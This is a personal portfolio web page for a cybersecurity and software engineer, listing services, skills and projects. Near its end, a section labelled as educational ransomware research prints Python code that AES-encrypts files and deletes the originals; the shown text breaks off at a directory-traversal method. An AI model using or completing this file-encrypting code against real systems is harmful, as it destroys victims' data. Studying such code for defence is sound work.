# josephchitalu2.github.io
portfolio website

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
    <title>J.Chitalu | Cybersecurity & Software Engineer</title>
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
    
    <style>
        /* ============================================================
           CSS VARIABLES (JetBrains Dark Theme)
           ============================================================ */
        :root {
            --bg-primary: #0d0d0d;
            --bg-secondary: #1a1a1a;
            --bg-surface: #242424;
            --bg-elevated: #2d2d2d;
            --bg-card: #1e1e1e;
            --text-primary: #e8e8e8;
            --text-secondary: #a0a0a0;
            --text-muted: #6b6b6b;
            --text-highlight: #ffffff;
            --accent-teal: #40b4a4;
            --accent-teal-dim: rgba(64, 180, 164, 0.15);
            --accent-blue: #4a9eff;
            --accent-purple: #b77aff;
            --accent-orange: #ff8a5c;
            --accent-red: #ff5f57;
            --border-subtle: #2a2a2a;
            --border-medium: #3a3a3a;
            --font-sans: 'Inter', system-ui, -apple-system, sans-serif;
            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
            --nav-height: 64px;
            --max-width: 1200px;
            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --radius: 12px;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        /* ============================================================
           RESET & BASE
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: var(--font-sans);
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
            padding-top: var(--nav-height);
        }

        ::selection {
            background: var(--accent-teal);
            color: var(--bg-primary);
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--accent-teal);
            border-radius: 3px;
        }

        /* ============================================================
           UTILITY
           ============================================================ */
        .container {
            max-width: var(--max-width);
            margin: 0 auto;
            padding: 0 1.25rem;
        }

        .section-padding {
            padding: 4rem 0;
        }

        .section-label {
            display: inline-block;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 0.15em;
            text-transform: uppercase;
            color: var(--accent-teal);
            margin-bottom: 0.5rem;
            font-family: var(--font-mono);
        }

        .section-title {
            font-size: 2.2rem;
            font-weight: 800;
            letter-spacing: -0.02em;
            line-height: 1.15;
            margin-bottom: 0.75rem;
            background: linear-gradient(135deg, var(--text-highlight) 40%, var(--text-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .section-subtitle {
            color: var(--text-secondary);
            font-size: 1rem;
            max-width: 560px;
            line-height: 1.7;
        }

        /* ============================================================
           NAVBAR
           ============================================================ */
        .navbar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: var(--nav-height);
            background: rgba(13, 13, 13, 0.92);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-bottom: 1px solid var(--border-subtle);
            z-index: 1000;
            display: flex;
            align-items: center;
        }

        .navbar .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .logo {
            font-family: var(--font-mono);
            font-weight: 700;
            font-size: 1.1rem;
            color: var(--text-highlight);
            text-decoration: none;
            letter-spacing: -0.02em;
        }

        .logo span {
            color: var(--accent-teal);
        }

        .nav-links {
            display: flex;
            gap: 1.75rem;
            list-style: none;
            align-items: center;
        }

        .nav-links a {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.8rem;
            font-weight: 500;
            transition: color var(--transition);
            position: relative;
        }

        .nav-links a::after {
            content: '';
            position: absolute;
            bottom: -4px;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--accent-teal);
            transition: width var(--transition);
        }

        .nav-links a:hover {
            color: var(--text-highlight);
        }
        .nav-links a:hover::after {
            width: 100%;
        }

        .nav-cta {
            padding: 0.4rem 1rem;
            background: var(--accent-teal);
            color: var(--bg-primary) !important;
            border-radius: 6px;
            font-weight: 600;
        }
        .nav-cta::after {
            display: none !important;
        }
        .nav-cta:hover {
            background: #4fc3b3 !important;
            color: var(--bg-primary) !important;
        }

        /* Mobile Toggle */
        .menu-toggle {
            display: none;
            flex-direction: column;
            gap: 5px;
            cursor: pointer;
            background: none;
            border: none;
            padding: 5px;
        }

        .menu-toggle span {
            display: block;
            width: 24px;
            height: 2px;
            background: var(--text-primary);
            transition: var(--transition);
        }

        .menu-toggle.active span:nth-child(1) {
            transform: rotate(45deg) translate(5px, 5px);
        }
        .menu-toggle.active span:nth-child(2) {
            opacity: 0;
        }
        .menu-toggle.active span:nth-child(3) {
            transform: rotate(-45deg) translate(5px, -5px);
        }

        /* ============================================================
           HERO
           ============================================================ */
        .hero {
            min-height: calc(100vh - var(--nav-height));
            display: flex;
            align-items: center;
            position: relative;
            overflow: hidden;
            padding: 2rem 0;
        }

        .hero::before {
            content: '';
            position: absolute;
            top: -40%;
            right: -20%;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(64, 180, 164, 0.07), transparent 70%);
            pointer-events: none;
        }

        .hero-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: center;
            position: relative;
            z-index: 1;
            width: 100%;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.25rem 1rem;
            border: 1px solid var(--border-subtle);
            border-radius: 100px;
            font-size: 0.7rem;
            color: var(--text-secondary);
            font-weight: 500;
            letter-spacing: 0.05em;
            margin-bottom: 1.25rem;
            font-family: var(--font-mono);
        }

        .hero-badge .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #28c840;
            display: inline-block;
            animation: pulse-dot 2s infinite;
        }

        @keyframes pulse-dot {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .hero h1 {
            font-size: 3.2rem;
            font-weight: 800;
            letter-spacing: -0.03em;
            line-height: 1.1;
            margin-bottom: 0.5rem;
        }

        .hero h1 .highlight {
            color: var(--accent-teal);
        }

        .hero .subtitle {
            font-size: 1.2rem;
            font-weight: 400;
            color: var(--text-secondary);
            margin-bottom: 0.5rem;
        }

        .hero .subtitle-2 {
            font-size: 1rem;
            color: var(--text-muted);
            margin-bottom: 1rem;
        }

        .hero p {
            color: var(--text-secondary);
            max-width: 440px;
            margin-bottom: 1.75rem;
            font-size: 0.95rem;
            line-height: 1.7;
        }

        .hero-stats {
            display: flex;
            gap: 2.5rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .hero-stats .stat {
            display: flex;
            flex-direction: column;
        }

        .hero-stats .stat .number {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--text-highlight);
            font-family: var(--font-mono);
        }

        .hero-stats .stat .label {
            font-size: 0.7rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .btn-group {
            display: flex;
            gap: 0.75rem;
            flex-wrap: wrap;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.7rem 1.5rem;
            border-radius: 8px;
            font-weight: 600;
            font-size: 0.85rem;
            text-decoration: none;
            transition: all var(--transition);
            cursor: pointer;
            border: none;
            font-family: var(--font-sans);
        }

        .btn-primary {
            background: var(--accent-teal);
            color: var(--bg-primary);
        }

        .btn-primary:hover {
            background: #4fc3b3;
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(64, 180, 164, 0.25);
        }

        .btn-secondary {
            background: var(--bg-surface);
            color: var(--text-primary);
            border: 1px solid var(--border-subtle);
        }

        .btn-secondary:hover {
            background: var(--bg-elevated);
            border-color: var(--accent-teal);
            transform: translateY(-2px);
        }

        .btn-outline {
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border-subtle);
        }

        .btn-outline:hover {
            border-color: var(--text-primary);
            color: var(--text-highlight);
        }

        /* Terminal */
        .terminal-wrapper {
            width: 100%;
        }

        .terminal {
            background: var(--bg-secondary);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius);
            padding: 1.25rem;
            font-family: var(--font-mono);
            font-size: 0.8rem;
            overflow: hidden;
            box-shadow: var(--shadow);
        }

        .terminal-dots {
            display: flex;
            gap: 6px;
            margin-bottom: 0.75rem;
        }

        .terminal-dots span {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: block;
        }

        .terminal-dots span:nth-child(1) { background: #ff5f57; }
        .terminal-dots span:nth-child(2) { background: #ffbd2e; }
        .terminal-dots span:nth-child(3) { background: #28c840; }

        .terminal-line {
            color: #4fc3b3;
            white-space: pre-wrap;
            word-break: break-word;
            line-height: 1.8;
        }

        .terminal-line .prompt {
            color: var(--text-secondary);
        }
        .terminal-line .cmd {
            color: var(--text-highlight);
        }
        .terminal-line .output {
            color: var(--text-secondary);
        }
        .terminal-line .highlight-text {
            color: var(--accent-teal);
        }

        .terminal-line .cursor {
            display: inline-block;
            width: 8px;
            height: 1.1em;
            background: var(--accent-teal);
            animation: blink 1s step-end infinite;
            vertical-align: text-bottom;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        /* ============================================================
           SERVICES / FREELANCE
           ============================================================ */
        .services-section {
            border-top: 1px solid var(--border-subtle);
        }

        .services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 1.25rem;
            margin-top: 2rem;
        }

        .service-card {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius);
            padding: 1.5rem;
            text-align: center;
            transition: all var(--transition);
        }

        .service-card:hover {
            border-color: var(--accent-teal);
            transform: translateY(-4px);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
        }

        .service-card .icon {
            font-size: 2.2rem;
            margin-bottom: 0.5rem;
        }

        .service-card h3 {
            font-size: 0.95rem;
            font-weight: 600;
            margin-bottom: 0.25rem;
            color: var(--text-highlight);
        }

        .service-card p {
            font-size: 0.8rem;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        /* ============================================================
           SKILLS
           ============================================================ */
        .skills-section {
            border-top: 1px solid var(--border-subtle);
        }

        .skills-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 1.25rem;
            margin-top: 2rem;
        }

        .skill-card {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius);
            padding: 1.5rem;
            transition: all var(--transition);
        }

        .skill-card:hover {
            border-color: var(--accent-teal);
            transform: translateY(-4px);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
        }

        .skill-card .icon {
            font-size: 1.75rem;
            margin-bottom: 0.5rem;
        }

        .skill-card h3 {
            font-size: 0.95rem;
            font-weight: 600;
            margin-bottom: 0.25rem;
            color: var(--text-highlight);
        }

        .skill-card p {
            font-size: 0.8rem;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        .skill-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 0.4rem;
            margin-top: 0.6rem;
        }

        .skill-tag {
            padding: 0.15rem 0.6rem;
            background: var(--bg-elevated);
            border-radius: 100px;
            font-size: 0.6rem;
            color: var(--text-secondary);
            border: 1px solid var(--border-subtle);
            font-family: var(--font-mono);
        }

        /* ============================================================
           PROJECTS
           ============================================================ */
        .projects-section {
            border-top: 1px solid var(--border-subtle);
        }

        .projects-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-top: 2rem;
        }

        .project-card {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius);
            padding: 1.5rem;
            transition: all var(--transition);
            position: relative;
            overflow: hidden;
        }

        .project-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: var(--accent-teal);
            opacity: 0;
            transition: opacity var(--transition);
        }

        .project-card:hover {
            border-color: var(--accent-teal);
            transform: translateY(-4px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
        }

        .project-card:hover::before {
            opacity: 1;
        }

        .project-card .project-icon {
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }

        .project-card .project-badge {
            display: inline-block;
            font-size: 0.55rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: var(--accent-teal);
            background: var(--accent-teal-dim);
            padding: 0.15rem 0.6rem;
            border-radius: 4px;
            margin-bottom: 0.5rem;
            font-family: var(--font-mono);
        }

        .project-card h3 {
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 0.4rem;
            color: var(--text-highlight);
        }

        .project-card p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.6;
            margin-bottom: 0.75rem;
        }

        .project-card .tech-stack {
            display: flex;
            flex-wrap: wrap;
            gap: 0.4rem;
            margin-bottom: 0.75rem;
        }

        .project-card .tech-stack span {
            padding: 0.1rem 0.5rem;
            background: var(--bg-elevated);
            border-radius: 4px;
            font-size: 0.6rem;
            color: var(--text-secondary);
            border: 1px solid var(--border-subtle);
            font-family: var(--font-mono);
        }

        .project-card .project-link {
            color: var(--accent-teal);
            text-decoration: none;
            font-size: 0.8rem;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 0.3rem;
            transition: gap var(--transition);
        }

        .project-card .project-link:hover {
            gap: 0.6rem;
        }

        /* ============================================================
           RANSOMWARE CODE SNIPPET
           ============================================================ */
        .code-section {
            border-top: 1px solid var(--border-subtle);
        }

        .code-block {
            background: var(--bg-secondary);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius);
            padding: 1.5rem;
            overflow-x: auto;
            margin-top: 1.5rem;
            font-family: var(--font-mono);
            font-size: 0.7rem;
            line-height: 1.8;
            color: var(--text-secondary);
            max-height: 450px;
            overflow-y: auto;
        }

        .code-block .comment {
            color: #6a9955;
        }
        .code-block .keyword {
            color: #c586c0;
        }
        .code-block .string {
            color: #ce9178;
        }
        .code-block .function {
            color: #dcdcaa;
        }
        .code-block .class {
            color: #4ec9b0;
        }
        .code-block .number {
            color: #b5cea8;
        }
        .code-block .builtin {
            color: #4ec9b0;
        }

        /* ============================================================
           CONTACT
           ============================================================ */
        .contact-section {
            border-top: 1px solid var(--border-subtle);
        }

        .contact-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            margin-top: 2rem;
        }

        .contact-info h3 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .contact-info p {
            color: var(--text-secondary);
            font-size: 0.9rem;
            line-height: 1.7;
            margin-bottom: 1.5rem;
        }

        .contact-item {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 0.6rem;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.85rem;
            transition: color var(--transition);
            padding: 0.4rem 0.6rem;
            border-radius: 6px;
            border: 1px solid transparent;
        }

        .contact-item:hover {
            color: var(--accent-teal);
            border-color: var(--border-subtle);
            background: var(--bg-surface);
        }

        .contact-item .copy-btn {
            margin-left: auto;
            font-size: 0.6rem;
            color: var(--text-muted);
            background: var(--bg-elevated);
            padding: 0.1rem 0.5rem;
            border-radius: 4px;
            cursor: pointer;
            border: none;
            color: var(--text-secondary);
            font-family: var(--font-sans);
        }

        .contact-item .copy-btn:hover {
            background: var(--accent-teal);
            color: var(--bg-primary);
        }

        .contact-form input,
        .contact-form textarea {
            width: 100%;
            padding: 0.7rem 1rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border-subtle);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: var(--font-sans);
            font-size: 0.85rem;
            transition: border-color var(--transition);
            margin-bottom: 0.75rem;
        }

        .contact-form input:focus,
        .contact-form textarea:focus {
            outline: none;
            border-color: var(--accent-teal);
        }

        .contact-form textarea {
            min-height: 100px;
            resize: vertical;
        }

        .availability-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.4rem 1rem;
            background: var(--accent-teal-dim);
            border: 1px solid var(--accent-teal);
            border-radius: 100px;
            font-size: 0.75rem;
            color: var(--accent-teal);
            font-weight: 500;
            margin-top: 0.5rem;
        }

        /* ============================================================
           FOOTER
           ============================================================ */
        .footer {
            border-top: 1px solid var(--border-subtle);
            padding: 2rem 0;
            text-align: center;
            color: var(--text-muted);
            font-size: 0.75rem;
        }

        .footer a {
            color: var(--accent-teal);
            text-decoration: none;
        }

        .footer .footer-links {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            margin-top: 0.5rem;
            flex-wrap: wrap;
        }

        .footer .footer-links a {
            color: var(--text-muted);
            text-decoration: none;
            font-size: 0.7rem;
            transition: color var(--transition);
        }

        .footer .footer-links a:hover {
            color: var(--text-primary);
        }

        /* ============================================================
           RESPONSIVE
           ============================================================ */
        @media (max-width: 1024px) {
            .hero-grid {
                grid-template-columns: 1fr;
                gap: 2rem;
            }
            .hero h1 {
                font-size: 2.8rem;
            }
            .contact-grid {
                grid-template-columns: 1fr;
                gap: 2rem;
            }
        }

        @media (max-width: 768px) {
            .menu-toggle {
                display: flex;
            }

            .nav-links {
                position: fixed;
                top: var(--nav-height);
                left: 0;
                right: 0;
                background: var(--bg-secondary);
                flex-direction: column;
                padding: 1.5rem 2rem;
                gap: 1.25rem;
                transform: translateY(-120%);
                transition: transform var(--transition);
                border-bottom: 1px solid var(--border-subtle);
            }

            .nav-links.open {
                transform: translateY(0);
            }

            .hero h1 {
                font-size: 2.2rem;
            }
            .hero .subtitle {
                font-size: 1rem;
            }
            .hero-stats {
                gap: 1.5rem;
            }
            .hero-stats .stat .number {
                font-size: 1.2rem;
            }

            .projects-grid {
                grid-template-columns: 1fr;
            }
            .skills-grid {
                grid-template-columns: 1fr 1fr;
            }
            .services-grid {
                grid-template-columns: 1fr 1fr;
            }

            .section-title {
                font-size: 1.8rem;
            }

            .terminal {
                font-size: 0.7rem;
                padding: 1rem;
            }

            .code-block {
                font-size: 0.6rem;
                padding: 1rem;
                max-height: 300px;
            }
        }

        @media (max-width: 480px) {
            .skills-grid {
                grid-template-columns: 1fr;
            }
            .services-grid {
                grid-template-columns: 1fr;
            }
            .hero h1 {
                font-size: 1.8rem;
            }
            .btn {
                padding: 0.6rem 1.2rem;
                font-size: 0.8rem;
            }
            .hero-stats {
                flex-wrap: wrap;
                gap: 1rem;
            }
            .container {
                padding: 0 1rem;
            }
        }
    </style>
</head>
<body>

    <!-- ============================================================
    NAVBAR
    ============================================================ -->
    <nav class="navbar" role="navigation" aria-label="Main navigation">
        <div class="container">
            <a href="#" class="logo">&lt;<span>/</span>&gt; Joseph</a>

            <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
                <span></span>
                <span></span>
                <span></span>
            </button>

            <ul class="nav-links" id="navLinks">
                <li><a href="#home">Home</a></li>
                <li><a href="#services">Services</a></li>
                <li><a href="#skills">Skills</a></li>
                <li><a href="#projects">Projects</a></li>
                <li><a href="#code">Code</a></li>
                <li><a href="#contact" class="nav-cta">Contact</a></li>
            </ul>
        </div>
    </nav>

    <!-- ============================================================
    HERO
    ============================================================ -->
    <section class="hero" id="home">
        <div class="container">
            <div class="hero-grid">
                <div class="hero-content">
                    <div class="hero-badge">
                        <span class="dot"></span>
                        Open for Freelance &amp; Full-Time
                    </div>

                    <h1>
                        joseph<span class="highlight">Chitalu</span>
                    </h1>
                    <div class="subtitle">Cybersecurity Engineer &amp; Software Developer</div>
                    <div class="subtitle-2">🔐 Securing networks · 💻 Building software · ⚡ Automating everything</div>

                    <p>
                        I architect secure networks, build full-stack applications, 
                        and automate infrastructure. Available for freelance software 
                        engineering and security consulting.
                    </p>

                    <div class="hero-stats">
                        <div class="stat">
                            <span class="number">3+</span>
                            <span class="label">Years Experience</span>
                        </div>
                        <div class="stat">
                            <span class="number">ICTAZ/ZICTA/IASACA/ZICA</span>
                            <span class="label">Security Certified</span>
                        </div>
                        <div class="stat">
                            <span class="number">12+</span>
                            <span class="label">Projects Delivered</span>
                        </div>
                        <div class="stat">
                            <span class="number">100%</span>
                            <span class="label">Client Satisfaction</span>
                        </div>
                    </div>

                    <div class="btn-group">
                        <a href="#services" class="btn btn-primary">My Services →</a>
                        <a href="#projects" class="btn btn-secondary">View Projects</a>
                        <a href="#contact" class="btn btn-outline">Hire Me</a>
                    </div>
                </div>

                <!-- Terminal -->
                <div class="terminal-wrapper">
                    <div class="terminal">
                        <div class="terminal-dots">
                            <span></span><span></span><span></span>
                        </div>
                        <div class="terminal-line" id="terminalText">
                            <span class="prompt">$</span> <span class="cmd">whoami</span><br />
                            <span class="output">  Joseph Chitalu — Cybersecurity &amp; Software Engineer</span><br />
                            <span class="prompt">$</span> <span class="cmd">cat /etc/skills</span><br />
                            <span class="output">  Python · TypeScript · React · Cisco · AWS · Zero-Trust</span><br />
                            <span class="prompt">$</span> <span class="cmd">./current-focus</span><br />
                            <span class="output">  CCNP Security &bull; Network Automation &bull; POS/IMS</span><br />
                            <span class="prompt">$</span> <span class="cmd">./freelance-status</span><br />
                            <span class="output highlight-text">  ✅ Available for freelance software engineering</span><br />
                            <span class="prompt">$</span> <span id="typingCursor"><span class="cursor"></span></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- ============================================================
    SERVICES / FREELANCE
    ============================================================ -->
    <section class="services-section section-padding" id="services">
        <div class="container">
            <span class="section-label">✦ Freelance</span>
            <h2 class="section-title">Software Engineering Services</h2>
            <p class="section-subtitle">
                I build secure, scalable, and maintainable software. Available 
                for freelance projects, consulting, and part-time engagements.
            </p>

            <div class="services-grid">
                <div class="service-card">
                    <div class="icon">💻</div>
                    <h3>Full-Stack Development</h3>
                    <p>Web applications with React, FastAPI, Python, TypeScript, and SQL/NoSQL databases.</p>
                </div>

                <div class="service-card">
                    <div class="icon">🔐</div>
                    <h3>Security Engineering</h3>
                    <p>Security audits, vulnerability assessments, Zero-Trust architecture, and network hardening.</p>
                </div>

                <div class="service-card">
                    <div class="icon">⚡</div>
                    <h3>Network Automation</h3>
                    <p>Automate network infrastructure with Python, Ansible, and CI/CD pipelines.</p>
                </div>

                <div class="service-card">
                    <div class="icon">📦</div>
                    <h3>Custom Software</h3>
                    <p>Tailored solutions: inventory systems, POS, dashboards, and internal tools.</p>
                </div>
            </div>

            <div style="margin-top:2rem; text-align:center;">
                <span class="availability-badge">
                    ⚡ Available for freelance work — Let's build something great together
                </span>
            </div>
        </div>
    </section>

    <!-- ============================================================
    SKILLS
    ============================================================ -->
    <section class="skills-section section-padding" id="skills">
        <div class="container">
            <span class="section-label">✦ Expertise</span>
            <h2 class="section-title">Technical Arsenal</h2>
            <p class="section-subtitle">Tools and technologies I work with daily across security, networking, and development.</p>

            <div class="skills-grid">
                <div class="skill-card">
                    <div class="icon">🔐</div>
                    <h3>Security Engineering</h3>
                    <p>Zero-Trust, Firewalls, IDS/IPS, IAM, Threat Detection</p>
                    <div class="skill-tags">
                        <span class="skill-tag">Cisco Firepower</span>
                        <span class="skill-tag">ISE</span>
                        <span class="skill-tag">Zero-Trust</span>
                        <span class="skill-tag">Suricata</span>
                    </div>
                </div>

                <div class="skill-card">
                    <div class="icon">🌐</div>
                    <h3>Network Architecture</h3>
                    <p>Routing, Switching, SD-WAN, Automation, BGP/OSPF</p>
                    <div class="skill-tags">
                        <span class="skill-tag">CCNP</span>
                        <span class="skill-tag">BGP/OSPF</span>
                        <span class="skill-tag">SD-WAN</span>
                        <span class="skill-tag">Python</span>
                    </div>
                </div>

                <div class="skill-card">
                    <div class="icon">💻</div>
                    <h3>Full-Stack Development</h3>
                    <p>Python, TypeScript, React, FastAPI, SQLite</p>
                    <div class="skill-tags">
                        <span class="skill-tag">Python</span>
                        <span class="skill-tag">TypeScript</span>
                        <span class="skill-tag">FastAPI</span>
                        <span class="skill-tag">React</span>
                    </div>
                </div>

                <div class="skill-card">
                    <div class="icon">☁️</div>
                    <h3>Cloud &amp; DevOps</h3>
                    <p>AWS, Terraform, Docker, CI/CD, Infrastructure as Code</p>
                    <div class="skill-tags">
                        <span class="skill-tag">AWS</span>
                        <span class="skill-tag">Terraform</span>
                        <span class="skill-tag">Docker</span>
                        <span class="skill-tag">CI/CD</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- ============================================================
    PROJECTS
    ============================================================ -->
    <section class="projects-section section-padding" id="projects">
        <div class="container">
            <span class="section-label">✦ Portfolio</span>
            <h2 class="section-title">Featured Projects</h2>
            <p class="section-subtitle">Real-world systems I've designed, built, and deployed from the ground up.</p>

            <div class="projects-grid">
                <!-- Project 1: IMS -->
                <div class="project-card">
                    <div class="project-icon">📦</div>
                    <span class="project-badge">v4.0 · Enterprise</span>
                    <h3>Inventory Management System</h3>
                    <p>
                        Production-ready IMS with repository pattern, service layer, 
                        audit trail, transaction management, and CSV backup/restore.
                        Powers the POS system as its backend.
                    </p>
                    <div class="tech-stack">
                        <span>Python</span>
                        <span>SQLite</span>
                        <span>FastAPI</span>
                        <span>CSV Export</span>
                    </div>
                    <a href="#" class="project-link" onclick="alert('📦 IMS v4.0 — Full source code available on GitHub: github.com/josephchitalu2')">View on GitHub →</a>
                </div>

                <!-- Project 2: POS -->
                <div class="project-card">
                    <div class="project-icon">💳</div>
                    <span class="project-badge">Real-time · Integrated</span>
                    <h3>Point of Sale System</h3>
                    <p>
                        Full-featured POS with barcode search, real-time inventory 
                        sync, low-stock alerts, and seamless checkout flow. 
                        Built on top of the IMS backend.
                    </p>
                    <div class="tech-stack">
                        <span>HTML/CSS</span>
                        <span>JavaScript</span>
                        <span>Tailwind</span>
                        <span>REST API</span>
                    </div>
                    <a href="#" class="project-link" onclick="alert('💳 POS System — Live demo available. Contact me for access.')">View Demo →</a>
                </div>

                <!-- Project 3: Ransomware Research -->
                <div class="project-card">
                    <div class="project-icon">🛡️</div>
                    <span class="project-badge">Research · Educational</span>
                    <h3>Ransomware Research Lab</h3>
                    <p>
                        Isolated environment for studying ransomware mechanics, 
                        encryption algorithms, privilege escalation, and detection 
                        evasion. Built detection tools alongside the research.
                    </p>
                    <div class="tech-stack">
                        <span>Python</span>
                        <span>Crypto</span>
                        <span>GNS3</span>
                        <span>ELK Stack</span>
                    </div>
                    <a href="#code" class="project-link">View Code Snippet →</a>
                </div>
            </div>
        </div>
    </section>

    <!-- ============================================================
    RANSOMWARE CODE SNIPPET
    ============================================================ -->
    <section class="code-section section-padding" id="code">
        <div class="container">
            <span class="section-label">✦ Research</span>
            <h2 class="section-title">Ransomware — Educational Code</h2>
            <p class="section-subtitle">
                For educational purposes only. Demonstrates encryption mechanics, 
                file traversal, and detection evasion techniques in a controlled lab environment.
            </p>

            <div class="code-block">
                <pre><span class="comment"># =============================================================================</span>
<span class="comment"># EDUCATIONAL RANSOMWARE RESEARCH — FOR LAB USE ONLY</span>
<span class="comment"># Author: Joseph Chitalu</span>
<span class="comment"># Purpose: Understanding ransomware mechanics for defense</span>
<span class="comment"># =============================================================================</span>

<span class="keyword">import</span> os
<span class="keyword">import</span> sys
<span class="keyword">import</span> hashlib
<span class="keyword">import</span> json
<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
<span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad
<span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes

<span class="comment"># =============================================================================</span>
<span class="comment"># ENCRYPTION CORE</span>
<span class="comment"># =============================================================================</span>

<span class="keyword">class</span> <span class="class">RansomwareResearch</span>:
    <span class="string">"""Educational ransomware simulation for security research."""</span>
    
    <span class="keyword">def</span> <span class="function">__init__</span>(self, target_dir: str):
        <span class="keyword">self</span>.target_dir = target_dir
        <span class="keyword">self</span>.key = <span class="builtin">None</span>
        <span class="keyword">self</span>.iv = <span class="builtin">None</span>
    
    <span class="keyword">def</span> <span class="function">generate_key</span>(self) -> bytes:
        <span class="string">"""Generate a random AES-256 key for encryption."""</span>
        <span class="keyword">self</span>.key = get_random_bytes(<span class="number">32</span>)  <span class="comment"># AES-256</span>
        <span class="keyword">self</span>.iv = get_random_bytes(<span class="number">16</span>)   <span class="comment"># AES block size</span>
        <span class="keyword">return</span> <span class="keyword">self</span>.key
    
    <span class="keyword">def</span> <span class="function">encrypt_file</span>(self, filepath: str) -> bool:
        <span class="string">"""Encrypt a single file using AES-256 CBC."""</span>
        <span class="keyword">try</span>:
            <span class="comment"># Read file content</span>
            <span class="keyword">with</span> open(filepath, <span class="string">'rb'</span>) <span class="keyword">as</span> f:
                plaintext = f.read()
            
            <span class="comment"># Encrypt with AES-256</span>
            cipher = AES.new(<span class="keyword">self</span>.key, AES.MODE_CBC, <span class="keyword">self</span>.iv)
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            
            <span class="comment"># Write encrypted data with IV prepended</span>
            <span class="keyword">with</span> open(filepath + <span class="string">'.encrypted'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:
                f.write(<span class="keyword">self</span>.iv + ciphertext)
            
            <span class="comment"># Remove original file (simulation)</span>
            os.remove(filepath)
            <span class="keyword">return</span> <span class="keyword">True</span>
        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
            print(<span class="string">f"[-] Error encrypting {filepath}: {e}"</span>)
            <span class="keyword">return</span> <span class="keyword">False</span>
    
    <span class="keyword">def</span> <span class="function">traverse_directory</span>(self):
